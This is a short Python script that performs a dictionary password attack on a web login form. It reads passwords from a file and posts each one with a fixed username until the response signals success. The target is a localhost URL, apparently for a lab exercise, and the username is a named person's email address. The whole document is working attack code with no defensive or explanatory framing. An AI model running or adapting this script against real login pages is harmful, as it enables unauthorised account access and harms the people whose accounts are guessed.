import requests
from requests.auth import HTTPBasicAuth

def dictionary_attack(username, password_file, target_url):
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            print(f"Trying password: {password}")
            response = requests.post(target_url, data={'username': username, 'password': password, 'userType': 'stakeholder'})
            content = response.content.decode()
            if content.find("Successfully") != -1:
                print(f"Success! Password found: {password}")
                return

        print("Dictionary exhausted. Password not found.")

if __name__ == "__main__":
    username = "jain.rahul@iitgn.ac.in"  # Change this to the target username
    password_file = "password.txt"  # Path to the password dictionary file
    target_url = "http://127.0.0.1:5000/login"  # URL to target login page
    
    dictionary_attack(username, password_file, target_url)